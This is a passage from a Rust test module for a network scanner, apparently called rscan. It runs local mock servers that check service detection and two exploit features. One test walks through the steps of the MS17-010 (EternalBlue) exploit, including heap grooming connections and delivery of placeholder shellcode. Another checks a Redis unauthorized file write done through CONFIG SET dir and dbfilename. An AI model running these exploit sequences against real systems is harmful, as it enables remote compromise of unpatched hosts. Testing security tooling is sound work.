                if index == 0 {
                    assert_eq!(
                        trans.len(),
                        smb1_trans2_exploit_packet(tree_id, user_id, 0, "zero").len()
                    );
                }
            }
            let echo = read_netbios_message(&mut exploit_stream).expect("echo should read");
            assert_eq!(echo[8], 0x2B);
            exploit_stream
                .write_all(&ms17010_framed_response(0x2B, tree_id, user_id, &[]))
                .expect("echo response should write");

            let (mut free_hole_start, _) =
                listener.accept().expect("free hole start should arrive");
            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
            free_hole_start
                .read_exact(&mut negotiate)
                .expect("free hole start negotiate should read");
            free_hole_start
                .write_all(&ms17010_negotiate_response())
                .expect("free hole start negotiate response should write");
            let free_hole_start_packet = read_netbios_message(&mut free_hole_start)
                .expect("free hole start packet should read");
            assert_eq!(free_hole_start_packet[8], 0x73);
            free_hole_start
                .write_all(&ms17010_framed_response(
                    0x73,
                    [0x00, 0x00],
                    [0x00, 0x00],
                    &[],
                ))
                .expect("free hole start response should write");

            let mut groom_streams = Vec::new();
            for _ in 0..MS17010_EXPLOIT_INITIAL_GROOMS {
                let (mut groom, _) = listener.accept().expect("groom should arrive");
                let mut header = vec![0u8; MS17010_SMB2_GROOM_HEADER.len()];
                groom
                    .read_exact(&mut header)
                    .expect("groom header should read");
                assert_eq!(header, MS17010_SMB2_GROOM_HEADER);
                groom_streams.push(groom);
            }

            let (mut free_hole_end, _) = listener.accept().expect("free hole end should arrive");
            let mut negotiate = vec![0u8; ms17010_negotiate_request().len()];
            free_hole_end
                .read_exact(&mut negotiate)
                .expect("free hole end negotiate should read");
            free_hole_end
                .write_all(&ms17010_negotiate_response())
                .expect("free hole end negotiate response should write");
            let free_hole_end_packet =
                read_netbios_message(&mut free_hole_end).expect("free hole end packet should read");
            assert_eq!(free_hole_end_packet[8], 0x73);
            free_hole_end
                .write_all(&ms17010_framed_response(
                    0x73,
                    [0x00, 0x00],
                    [0x00, 0x00],
                    &[],
                ))
                .expect("free hole end response should write");

            for _ in 0..MS17010_EXPLOIT_SECOND_GROOMS {
                let (mut groom, _) = listener.accept().expect("second groom should arrive");
                let mut header = vec![0u8; MS17010_SMB2_GROOM_HEADER.len()];
                groom
                    .read_exact(&mut header)
                    .expect("second groom header should read");
                assert_eq!(header, MS17010_SMB2_GROOM_HEADER);
                groom_streams.push(groom);
            }

            let final_packet =
                read_netbios_message(&mut exploit_stream).expect("final packet should read");
            assert_eq!(final_packet[8], 0x33);
            exploit_stream
                .write_all(&ms17010_framed_response(0x33, tree_id, user_id, &[]))
                .expect("final response should write");

            for (index, mut groom) in groom_streams.into_iter().enumerate() {
                let mut first = vec![0u8; MS17010_EXPLOIT_BODY_FIRST_CHUNK];
                groom
                    .read_exact(&mut first)
                    .expect("first groom payload should read");
                let mut second =
                    vec![0u8; MS17010_EXPLOIT_BODY_SECOND_END - MS17010_EXPLOIT_BODY_FIRST_CHUNK];
                groom
                    .read_exact(&mut second)
                    .expect("second groom payload should read");
                if index == 0 {
                    let mut captured = first;
                    captured.extend_from_slice(&second);
                    *capture.lock().expect("capture should lock") = captured;
                }
            }
        });

        set_ms17010_runtime_options(Ms17010RuntimeOptions {
            shellcode: Some("41414141414141414141".to_string()),
        });
        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "ms17010",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");
        set_ms17010_runtime_options(Ms17010RuntimeOptions::default());

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].details["exploit"], json!("payload-sent"));
        let captured = payload_capture.lock().expect("capture should lock").clone();
        assert!(!captured.is_empty());
        assert!(captured.windows(10).any(|window| window == b"AAAAAAAAAA"));
    }

    #[test]
    fn detects_findnet_identification() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut probe = vec![0u8; FINDNET_PROBE_ONE.len()];
            stream
                .read_exact(&mut probe)
                .expect("probe one should read");
            assert_eq!(probe, FINDNET_PROBE_ONE);
            stream
                .write_all(b"ok")
                .expect("probe one response should write");

            let mut probe = vec![0u8; FINDNET_PROBE_TWO.len()];
            stream
                .read_exact(&mut probe)
                .expect("probe two should read");
            assert_eq!(probe, FINDNET_PROBE_TWO);
            let mut response = vec![0u8; 42];
            response.extend(findnet_test_payload("DESKTOP01", &["10.0.0.5", "fe80::1"]));
            stream
                .write_all(&response)
                .expect("probe two response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "findnet",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "findnet");
        assert_eq!(findings[0].status, "identified");
        assert_eq!(findings[0].details["hostname"], json!("DESKTOP01"));
    }

    #[test]
    fn detects_netbios_identification() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();
        let udp = UdpSocket::bind("127.0.0.1:137").expect("udp should bind");

        let udp_server = thread::spawn(move || {
            let mut request = [0u8; 128];
            let (size, peer) = udp
                .recv_from(&mut request)
                .expect("udp request should arrive");
            assert_eq!(&request[..size], NETBIOS_UDP_PROBE);
            udp.send_to(&netbios_udp_response("WORKGROUP", "DESKTOP01"), peer)
                .expect("udp response should send");
        });

        let tcp_server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("tcp request should arrive");
            let mut session = [0u8; 128];
            let _ = stream.read(&mut session).expect("session should read");
            stream.write_all(b"\x82").expect("session ack should write");

            let mut negotiate = [0u8; 512];
            let _ = stream
                .read(&mut negotiate)
                .expect("negotiate one should read");
            stream
                .write_all(b"ok")
                .expect("negotiate one ack should write");
            let _ = stream
                .read(&mut negotiate)
                .expect("negotiate two should read");
            stream
                .write_all(&netbios_ntlm_response())
                .expect("ntlm response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "netbios",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        udp_server.join().expect("udp server should finish");
        tcp_server.join().expect("tcp server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "netbios");
        assert_eq!(findings[0].status, "identified");
        assert_eq!(findings[0].details["domain_name"], json!("WORKGROUP"));
        assert_eq!(findings[0].details["computer_name"], json!("DESKTOP01"));
    }

    #[test]
    fn detects_memcached_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 1024];
            let _ = stream.read(&mut buffer);
            stream
                .write_all(b"STAT pid 1\r\nEND\r\n")
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "memcached",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "memcached");
        assert_eq!(findings[0].status, "unauthorized-access");
    }

    #[test]
    fn detects_redis_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 1024];
            let _ = stream.read(&mut buffer);
            stream
                .write_all(b"$12\r\nredis_version\r\n")
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "redis",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "redis");
        assert_eq!(findings[0].status, "unauthorized");
    }

    #[test]
    fn executes_redis_custom_file_write() {
        set_redis_runtime_options(RedisRuntimeOptions {
            redis_write_path: Some("/tmp/pwned.txt".to_string()),
            redis_write_content: Some("hello\nworld".to_string()),
            ..RedisRuntimeOptions::default()
        });

        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut detect_stream, _) = listener.accept().expect("detect request should arrive");
            assert_eq!(
                redis_read_command(&mut detect_stream).expect("info should read"),
                "INFO\r\n"
            );
            detect_stream
                .write_all(b"$12\r\nredis_version\r\n")
                .expect("response should write");

            let (mut exploit_stream, _) = listener.accept().expect("exploit request should arrive");
            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("dbfilename should read"),
                "CONFIG GET dbfilename\r\n"
            );
            exploit_stream
                .write_all(b"*2\r\n$10\r\ndbfilename\r\n$8\r\ndump.rdb\r\n")
                .expect("dbfilename should write");

            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("dir should read"),
                "CONFIG GET dir\r\n"
            );
            exploit_stream
                .write_all(b"*2\r\n$3\r\ndir\r\n$4\r\n/tmp\r\n")
                .expect("dir should write");

            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("set dir should read"),
                "CONFIG SET dir /tmp\r\n"
            );
            exploit_stream
                .write_all(b"+OK\r\n")
                .expect("ok should write");

            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("set file should read"),
                "CONFIG SET dbfilename pwned.txt\r\n"
            );
            exploit_stream
                .write_all(b"+OK\r\n")
                .expect("ok should write");

            let write_command = redis_read_command(&mut exploit_stream).expect("set should read");
            assert!(write_command.contains("set x \"hello\\nworld\""));
            exploit_stream
                .write_all(b"+OK\r\n")
                .expect("ok should write");

            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("save should read"),
                "save\r\n"
            );
            exploit_stream
                .write_all(b"+OK\r\n")
                .expect("ok should write");

            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("restore file should read"),
                "CONFIG SET dbfilename dump.rdb\r\n"
            );
            exploit_stream
                .write_all(b"+OK\r\n")
                .expect("ok should write");

            assert_eq!(
                redis_read_command(&mut exploit_stream).expect("restore dir should read"),
                "CONFIG SET dir /tmp\r\n"
            );
            exploit_stream
                .write_all(b"+OK\r\n")
                .expect("ok should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "redis",
            &PluginContext {
                usernames: Vec::new(),
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");
        set_redis_runtime_options(RedisRuntimeOptions::default());

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "redis");
        assert_eq!(findings[0].status, "unauthorized");
    }

    #[test]
    fn detects_elasticsearch_unauthorized_access() {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let server = thread::spawn(move || {
            let (mut stream, _) = listener.accept().expect("request should arrive");
            let mut buffer = [0u8; 2048];
            let _ = stream.read(&mut buffer);
            let body = "[{\"health\":\"green\"}]";
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            stream
                .write_all(response.as_bytes())
                .expect("response should write");
        });

        let findings = scan_services(
            &[OpenService {
                host: "127.0.0.1".to_string(),
                port,
            }],
            "elasticsearch",
            &PluginContext {
                usernames: vec!["elastic".to_string()],
                passwords: Vec::new(),
                timeout_secs: 2,
                ssh_key_path: None,
            },
        )
        .expect("scan should succeed");

        server.join().expect("server should finish");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "elasticsearch");
        assert_eq!(findings[0].status, "unauthorized");
    }

    #[test]
    fn retries_connect_stream_until_success() {
        use std::io::ErrorKind;
        use std::sync::{
            Arc,
            atomic::{AtomicUsize, Ordering},
        };

        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let socket = listener.local_addr().expect("addr");
        let attempts = Arc::new(AtomicUsize::new(0));

        let server = thread::spawn(move || {
            let _ = listener.accept();
        });

        set_connection_runtime_options(ConnectionRuntimeOptions { max_retries: 2 });
        let attempts_for_connect = Arc::clone(&attempts);
        let stream = connect_stream_with(
            &socket,
            Duration::from_secs(1),
            &socket.to_string(),
            move |socket, timeout| {
                let attempt = attempts_for_connect.fetch_add(1, Ordering::SeqCst);
                if attempt < 2 {
                    Err(std::io::Error::new(ErrorKind::ConnectionRefused, "retry"))
                } else {
                    TcpStream::connect_timeout(socket, timeout)
                }
            },
        )
        .expect("connect stream should retry");
        drop(stream);
        set_connection_runtime_options(ConnectionRuntimeOptions::default());

        assert_eq!(attempts.load(Ordering::SeqCst), 3);
        server.join().expect("server should finish");
    }

    #[test]
    fn executes_service_tasks_with_module_parallelism() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let tasks = (0..4)
            .map(|port| ServiceScanTask {
                plugin_key: "ftp",
                target: OpenService {
                    host: "127.0.0.1".to_string(),
                    port,
                },
            })
            .collect::<Vec<_>>();
        let inflight = Arc::new(AtomicUsize::new(0));
        let max_inflight = Arc::new(AtomicUsize::new(0));

        let findings = execute_service_scan_tasks(
            tasks,
            ServiceScanRuntimeOptions {
                module_threads: 2,
                global_timeout_secs: 2,
                log_errors: false,
            },
            AuthRuntimeOptions::default(),
            RedisRuntimeOptions::default(),
            Ms17010RuntimeOptions::default(),
            ConnectionRuntimeOptions::default(),
            {
                let inflight = Arc::clone(&inflight);
                let max_inflight = Arc::clone(&max_inflight);
                move |task| {
                    let now = inflight.fetch_add(1, Ordering::SeqCst) + 1;
                    max_inflight.fetch_max(now, Ordering::SeqCst);
                    thread::sleep(Duration::from_millis(100));
                    inflight.fetch_sub(1, Ordering::SeqCst);
                    Ok(Some(PluginFinding {
                        plugin: task.plugin_key.to_string(),
                        target: task.target.clone(),
                        status: "identified".to_string(),
                        details: BTreeMap::new(),
                    }))
                }
            },
        )
        .expect("task execution should succeed");

        assert_eq!(findings.len(), 4);
        assert!(max_inflight.load(Ordering::SeqCst) >= 2);
    }

    #[test]
    fn stops_scheduling_service_tasks_after_global_timeout() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let tasks = (0..3)
            .map(|port| ServiceScanTask {
                plugin_key: "ftp",
                target: OpenService {
                    host: "127.0.0.1".to_string(),
                    port,
                },
            })
            .collect::<Vec<_>>();
        let executed = Arc::new(AtomicUsize::new(0));

        let findings = execute_service_scan_tasks(
            tasks,
            ServiceScanRuntimeOptions {
                module_threads: 1,
                global_timeout_secs: 1,
                log_errors: false,
            },
            AuthRuntimeOptions::default(),
            RedisRuntimeOptions::default(),
            Ms17010RuntimeOptions::default(),
            ConnectionRuntimeOptions::default(),
            {
                let executed = Arc::clone(&executed);
                move |task| {
                    executed.fetch_add(1, Ordering::SeqCst);
                    thread::sleep(Duration::from_millis(1_100));
                    Ok(Some(PluginFinding {
                        plugin: task.plugin_key.to_string(),
                        target: task.target.clone(),
                        status: "identified".to_string(),
                        details: BTreeMap::new(),
                    }))
                }
            },
        )
        .expect("task execution should succeed");

        assert_eq!(executed.load(Ordering::SeqCst), 1);
        assert_eq!(findings.len(), 1);
    }

    #[test]
    fn continues_after_individual_service_task_errors() {
        let tasks = vec![
            ServiceScanTask {
                plugin_key: "ssh",
                target: OpenService {
                    host: "127.0.0.1".to_string(),
                    port: 2222,
                },
            },
            ServiceScanTask {
                plugin_key: "memcached",
                target: OpenService {
                    host: "127.0.0.1".to_string(),
                    port: 11211,
                },
            },
        ];

        let findings = execute_service_scan_tasks(
            tasks,
            ServiceScanRuntimeOptions {
                module_threads: 1,
                global_timeout_secs: 2,
                log_errors: false,
            },
            AuthRuntimeOptions::default(),
            RedisRuntimeOptions::default(),
            Ms17010RuntimeOptions::default(),
            ConnectionRuntimeOptions::default(),
            |task| {
                if task.plugin_key == "ssh" {
                    anyhow::bail!("ssh password authentication failed");
                }

                Ok(Some(PluginFinding {
                    plugin: task.plugin_key.to_string(),
                    target: task.target.clone(),
                    status: "unauthorized-access".to_string(),
                    details: BTreeMap::new(),
                }))
            },
        )
        .expect("task execution should continue after plugin errors");

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].plugin, "memcached");
    }

    fn snmp_test_response(community: &str, system: &str) -> Vec<u8> {
        let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00];
        let varbind = ber_tlv(
            0x30,
            &[ber_tlv(0x06, &oid), ber_octet_string(system.as_bytes())].concat(),
        );
        let varbinds = ber_tlv(0x30, &varbind);
        let pdu = ber_tlv(
            0xa2,
            &[ber_integer(1), ber_integer(0), ber_integer(0), varbinds].concat(),
        );
        ber_tlv(
            0x30,
            &[ber_integer(1), ber_octet_string(community.as_bytes()), pdu].concat(),
        )
    }

    fn respond_neo4j_handshake(stream: &mut TcpStream, success: bool) -> Result<()> {
        let mut handshake = [0u8; 20];
        stream
            .read_exact(&mut handshake)
            .expect("handshake should read");
        stream
            .write_all(&[0x00, 0x00, 0x04, 0x04])
            .expect("version should write");

        let message = neo4j_read_message(stream)?;
        let as_text = String::from_utf8_lossy(&message);
        if success {
            stream
                .write_all(&neo4j_chunk_message(&[0xB1, 0x70, 0xA0]))
                .expect("success frame should write");
        } else {
            assert!(as_text.contains("scheme"));
            stream
                .write_all(&neo4j_chunk_message(&[0xB1, 0x7F, 0xA0]))
                .expect("failure frame should write");
        }
        Ok(())
    }

    fn mysql_handshake() -> Vec<u8> {
        let mut payload = Vec::new();
        payload.push(0x0a);
        payload.extend_from_slice(b"8.0.36\0");
        payload.extend_from_slice(&1u32.to_le_bytes());
        payload.extend_from_slice(b"12345678");
        payload.push(0x00);
        payload.extend_from_slice(&0xffffu16.to_le_bytes());
        payload.push(0x21);
        payload.extend_from_slice(&0x0002u16.to_le_bytes());
        payload.extend_from_slice(&0x0008u16.to_le_bytes());
        payload.push(21);
        payload.extend_from_slice(&[0u8; 10]);
        payload.extend_from_slice(b"abcdefghijklm");
        payload.push(0x00);
        payload.extend_from_slice(b"mysql_native_password\0");
        payload
    }

    fn postgres_read_startup(stream: &mut TcpStream) -> Result<Vec<u8>> {
        let mut header = [0u8; 4];
        stream
            .read_exact(&mut header)
            .context("failed to read postgres startup header")?;
        let length = u32::from_be_bytes(header) as usize;
        let mut payload = vec![0u8; length.saturating_sub(4)];
        stream
            .read_exact(&mut payload)
            .context("failed to read postgres startup payload")?;
        Ok(payload)
    }

    fn postgres_server_message(tag: u8, payload: &[u8]) -> Vec<u8> {
        let mut message = Vec::with_capacity(payload.len() + 5);
        message.push(tag);
        message.extend_from_slice(&((payload.len() + 4) as u32).to_be_bytes());
        message.extend_from_slice(payload);
        message
    }

    fn kafka_response_frame(correlation_id: i32, body: &[u8]) -> Vec<u8> {
        let mut payload = Vec::with_capacity(body.len() + 4);
        payload.extend_from_slice(&correlation_id.to_be_bytes());
        payload.extend_from_slice(body);
        let mut frame = Vec::with_capacity(payload.len() + 4);
        frame.extend_from_slice(&(payload.len() as u32).to_be_bytes());
        frame.extend_from_slice(&payload);
        frame
    }

    fn kafka_request_api_key(payload: &[u8]) -> Option<i16> {
        let bytes: [u8; 2] = payload.get(0..2)?.try_into().ok()?;
        Some(i16::from_be_bytes(bytes))
    }

    fn findnet_test_payload(hostname: &str, addresses: &[&str]) -> Vec<u8> {
        let mut payload = utf16le_bytes(hostname);
        payload.extend_from_slice(&[0, 0]);
        for address in addresses {
            payload.extend_from_slice(b"\x07\x00");
            payload.extend_from_slice(address.as_bytes());
            payload.extend_from_slice(&[0, 0, 0]);
        }
        payload.extend_from_slice(&[0, 0, 0, 0]);
        payload.extend_from_slice(FINDNET_END_MARKER);
        payload
    }

    fn utf16le_bytes(value: &str) -> Vec<u8> {
        value
            .encode_utf16()
            .flat_map(|unit| unit.to_le_bytes())
            .collect()
    }

    fn write_test_ssh_key(prefix: &str) -> PathBuf {
        let nonce = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .expect("system time should be after unix epoch")
            .as_nanos();
        let path =
            std::env::temp_dir().join(format!("rscan-{prefix}-{}-{nonce}.key", std::process::id()));
        fs::write(&path, TEST_SSH_PRIVATE_KEY).expect("ssh private key should write");
        path
    }

    fn spawn_ssh_server(
        expected_sessions: usize,
        username: &'static str,
        password: Option<&'static str>,
        allow_publickey: bool,
    ) -> (u16, thread::JoinHandle<()>) {
        let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
        let port = listener.local_addr().expect("local addr").port();

        let handle = thread::spawn(move || {
            let runtime = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .expect("tokio runtime should build");
            let host_key = russh::keys::PrivateKey::from_openssh(TEST_SSH_PRIVATE_KEY)
                .expect("host key should parse");
            let authorized_key = host_key.public_key().clone();

            let mut config = russh::server::Config {
                keys: vec![host_key],
                ..Default::default()
            };
            config.auth_rejection_time = std::time::Duration::from_millis(10);
            config.auth_rejection_time_initial = Some(std::time::Duration::from_millis(10));
            let config = Arc::new(config);

            let mut served = 0usize;
            while served < expected_sessions {
                let (stream, _) = listener.accept().expect("connection should accept");
                stream
                    .set_read_timeout(Some(std::time::Duration::from_millis(200)))
                    .expect("probe timeout should set");
                let mut probe = [0u8; 4];
                let peeked = match stream.peek(&mut probe) {
                    Ok(size) => size,
                    Err(error)
                        if matches!(error.kind(), ErrorKind::WouldBlock | ErrorKind::TimedOut) =>
                    {
                        continue;
                    }
                    Err(error) => panic!("failed to inspect ssh test connection: {error}"),
                };
                if peeked == 0 {
                    continue;
                }

                stream
                    .set_nonblocking(true)
                    .expect("stream should become nonblocking");
                let session = runtime
                    .block_on(async {
                        let stream = tokio::net::TcpStream::from_std(stream)
                            .expect("tokio stream should wrap");
                        russh::server::run_stream(
                            config.clone(),
                            stream,
                            TestSshHandler {
                                username: username.to_string(),
                                password: password.map(ToString::to_string),
                                authorized_key: allow_publickey.then(|| authorized_key.clone()),
                            },
                        )
                        .await
                    })
                    .expect("ssh session should start");
                let _ = runtime.block_on(session);
                served += 1;
            }
        });

        (port, handle)
    }

    fn netbios_udp_response(domain: &str, host: &str) -> Vec<u8> {
        let mut response = vec![0u8; 57];
        response[56] = 2;
        let mut domain_entry = [b' '; 18];
        domain_entry[..domain.len().min(15)]
            .copy_from_slice(&domain.as_bytes()[..domain.len().min(15)]);
        domain_entry[15] = 0x00;
        domain_entry[16] = 0x80;
        let mut host_entry = [b' '; 18];
        host_entry[..host.len().min(15)].copy_from_slice(&host.as_bytes()[..host.len().min(15)]);
        host_entry[15] = 0x20;
        response.extend_from_slice(&domain_entry);
        response.extend_from_slice(&host_entry);
        response
    }

    fn netbios_ntlm_response() -> Vec<u8> {
        let target_info_length = 106usize;
        let mut response = vec![0u8; 47 + target_info_length];
        response[43] = target_info_length as u8;
        response[44] = (target_info_length >> 8) as u8;

        let start = 60usize;
        response[start..start + 7].copy_from_slice(b"NTLMSSP");
        response[start + 40] = 48;
        response[start + 41] = 0;
        response[start + 44] = 45;
        let items = [
            0x03, 0x00, 0x12, 0x00, b'D', 0, b'E', 0, b'S', 0, b'K', 0, b'T', 0, b'O', 0, b'P', 0,
            b'0', 0, b'1', 0, 0x04, 0x00, 0x12, 0x00, b'W', 0, b'O', 0, b'R', 0, b'K', 0, b'G', 0,
            b'R', 0, b'O', 0, b'U', 0, b'P', 0, 0x00, 0x00, 0x00, 0x00,
        ];
        let items_start = start + 45;
        response[items_start..items_start + items.len()].copy_from_slice(&items);
        response.extend_from_slice(&utf16le_bytes("Windows Server 2022|"));
        response
    }

    fn ms17010_negotiate_response() -> Vec<u8> {
        let mut response = vec![0u8; 36];
        response[4..8].copy_from_slice(b"SMB\x72");
        response
    }

    fn ms17010_session_response(user_id: [u8; 2], os: &str) -> Vec<u8> {
        let byte_count = os.len() + 2;
        let mut response = vec![0u8; 45 + byte_count];
        response[4..8].copy_from_slice(b"SMB\x73");
        response[32..34].copy_from_slice(&user_id);
        response[36] = 1;
        response[43..45].copy_from_slice(&(byte_count as u16).to_le_bytes());
        response[46..46 + os.len()].copy_from_slice(os.as_bytes());
        response
    }

    fn ms17010_tree_response(tree_id: [u8; 2]) -> Vec<u8> {
        let mut response = vec![0u8; 36];
        response[4..8].copy_from_slice(b"SMB\x75");
        response[28..30].copy_from_slice(&tree_id);
        response
    }

    fn ms17010_named_pipe_response(vulnerable: bool) -> Vec<u8> {
        let mut response = vec![0u8; 36];
        response[4..8].copy_from_slice(b"SMB\x25");
        if vulnerable {
            response[9..13].copy_from_slice(&[0x05, 0x02, 0x00, 0xC0]);
        }
        response
    }

    fn ms17010_backdoor_response(backdoor: bool) -> Vec<u8> {
        let mut response = vec![0u8; 36];
        response[4..8].copy_from_slice(b"SMB\x32");
        if backdoor {
            response[34] = 0x51;
        }
        response
    }

    fn ms17010_tree_connect_request_for(host: &str, user_id: [u8; 2]) -> Vec<u8> {
        ms17010_tree_connect_request(host, user_id)
    }

    fn ms17010_trans_named_pipe_request_for(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
        let mut request = ms17010_trans_named_pipe_request();
        request[28..30].copy_from_slice(&tree_id);
        request[32..34].copy_from_slice(&user_id);
        request
    }

    fn ms17010_trans2_session_setup_request_for(tree_id: [u8; 2], user_id: [u8; 2]) -> Vec<u8> {
        let mut request = ms17010_trans2_session_setup_request();
        request[28..30].copy_from_slice(&tree_id);
        request[32..34].copy_from_slice(&user_id);
        request
    }

    fn read_netbios_message(stream: &mut TcpStream) -> Result<Vec<u8>> {
        let mut header = [0u8; 4];
        stream.read_exact(&mut header)?;
        let length =
            ((header[1] as usize) << 16) | ((header[2] as usize) << 8) | header[3] as usize;
        let mut body = vec![0u8; length];
        stream.read_exact(&mut body)?;
        let mut message = header.to_vec();
        message.extend_from_slice(&body);
        Ok(message)
    }

    fn ms17010_framed_response(
        command: u8,
        tree_id: [u8; 2],
        user_id: [u8; 2],
        extra: &[u8],
    ) -> Vec<u8> {
        let mut body = vec![0u8; 32];
        body[0..4].copy_from_slice(b"\xFFSMB");
        body[4] = command;
        body[24..26].copy_from_slice(&tree_id);
        body[28..30].copy_from_slice(&user_id);
        body.extend_from_slice(extra);
        let length = body.len() as u32;
        let mut packet = vec![0x00, 0x00, 0x00, 0x00];
        packet[1..4].copy_from_slice(&length.to_be_bytes()[1..4]);
        packet.extend_from_slice(&body);
        packet
    }

    fn mssql_login_ack_payload() -> Vec<u8> {
        vec![
            0xAD, 0x12, 0x00, 0x01, 0x74, 0x00, 0x00, 0x04, 0x05, b'r', 0, b's', 0, b'c', 0, b'a',
            0, b'n', 0, 0x00, 0x00, 0x00, 0x00, 0xFD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
        ]
    }

    fn mssql_login_username(payload: &[u8]) -> Option<String> {
        mssql_login_field(payload, 40)
    }

    fn mssql_login_password(payload: &[u8]) -> Option<String> {
        let offset = u16::from_le_bytes(payload.get(44..46)?.try_into().ok()?) as usize;
        let len = u16::from_le_bytes(payload.get(46..48)?.try_into().ok()?) as usize;
        let bytes = payload.get(offset..offset + len * 2)?;
        let decoded = bytes
            .iter()
            .map(|byte| (byte ^ 0xA5).rotate_left(4))
            .collect::<Vec<_>>();
        let units = decoded
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&units).ok()
    }

    fn mssql_login_field(payload: &[u8], offset_index: usize) -> Option<String> {
        let offset = u16::from_le_bytes(
            payload
                .get(offset_index..offset_index + 2)?
                .try_into()
                .ok()?,
        ) as usize;
        let len = u16::from_le_bytes(
            payload
                .get(offset_index + 2..offset_index + 4)?
                .try_into()
                .ok()?,
        ) as usize;
        let bytes = payload.get(offset..offset + len * 2)?;
        let units = bytes
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<_>>();
        String::from_utf16(&units).ok()
    }

    fn redis_read_command(stream: &mut TcpStream) -> std::io::Result<String> {
        stream
            .set_read_timeout(Some(std::time::Duration::from_millis(500)))
            .expect("read timeout should set");
        let mut buffer = Vec::new();
        let mut byte = [0u8; 1];
        loop {
            stream.read_exact(&mut byte)?;
            buffer.push(byte[0]);
            if byte[0] == b'\n' {
                break;
            }
        }
        Ok(String::from_utf8_lossy(&buffer).to_string())
    }
}
